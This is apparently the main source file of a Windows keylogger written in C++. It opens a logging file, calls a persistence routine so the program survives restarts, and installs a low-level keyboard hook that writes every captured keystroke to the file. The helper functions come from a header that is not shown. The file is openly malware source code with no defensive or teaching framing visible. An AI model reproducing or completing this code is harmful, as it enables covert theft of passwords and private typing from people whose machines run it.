#include "KeyLogger.h"

int main(int argc, char* argv[])
{
	if (argc > 1)
	{
		loggingFile = CreateNewLoggingFile(argv[1]);
	}
	else
	{
		loggingFile = CreateNewLoggingFile("");
	}
		
	if (loggingFile == INVALID_HANDLE_VALUE)
	{
		std::cout << "Could not get file handle error: " << GetLastError() << std::endl;
	}

	CreatePersistence(argv[0]);
	
    KeyboardHook = SetWindowsHookExA(
            WH_KEYBOARD_LL,
            KeyboardProc,
            GetModuleHandle(NULL),
            NULL
            );
	
    if (!KeyboardHook)
    {
        std::cout << "Could not get Keyboard Hook." << std::endl;
    }
    else
    {
        std::cout << "Capturing keyboard events to file... " << std::endl;
        MSG msg;
        while (GetMessage(&msg, nullptr, 0, 0) > 0)
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

	CloseHandle(loggingFile);
    return 0;
}

